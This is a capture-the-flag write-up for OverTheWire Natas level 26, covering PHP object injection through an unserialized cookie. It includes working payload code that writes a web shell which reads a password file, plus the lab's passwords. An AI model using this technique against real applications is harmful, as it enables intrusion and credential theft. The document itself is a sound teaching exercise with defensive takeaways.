<div style="font-family: 'Times New Roman', Times, serif; font-size: 12pt;">


# OverTheWire Natas — Level 26

## Objective

Exploit an Insecure Deserialization vulnerability (PHP Object Injection) to execute arbitrary code and retrieve the password.

## Access

* URL: http://natas26.natas.labs.overthewire.org/
* Username: natas26
* Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne

## Method

The application draws lines based on coordinates stored in a cookie named `drawing`. The source code reveals a `Logger` class designed to write log messages to a file upon the object's destruction (`__destruct()`).

The application uses `unserialize()` on the base64-encoded `drawing` cookie. Since the input is not sanitized, we can inject a malicious serialized object of the `Logger` class.

**Exploit Steps:**
1.  **Analyze the Class:** The `Logger` class has properties `$logFile`, `$initMsg`, and `$exitMsg`. The `__destruct()` method writes `$exitMsg` to `$logFile`.
2.  **Craft the Payload:** Write a local PHP script to generate the malicious object:
    ```php
    class Logger {
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file, $msg) {
            $this->logFile = $file;
            $this->exitMsg = $msg;
            $this->initMsg = ""; // Empty to keep it clean
        }
    }
    
    // Target file: Web accessible directory
    // Payload: Read the password file
    $o = new Logger("img/shell.php", "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>");
    echo base64_encode(serialize($o));
    ```
3.  **Inject:** Take the generated base64 string and set it as the value of the `drawing` cookie in the browser.
4.  **Execute:** Refresh the page. The application deserializes the object. When the script ends, `__destruct()` triggers, writing the PHP shell to `img/shell.php`.
5.  **Retrieve:** Navigate to `http://natas26.natas.labs.overthewire.org/img/shell.php` to view the flag.

## Result

Password for the next level obtained successfully.

55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ


## Key Takeaway

* **Insecure Deserialization** occurs when user-controlled data is passed to `unserialize()`.
* Attackers can manipulate object properties to trigger "gadget chains" (code defined in magic methods like `__destruct`, `__wakeup`, or `__toString`) to execute arbitrary actions.
* Never unserialize data from untrusted sources; use JSON instead.
</div>
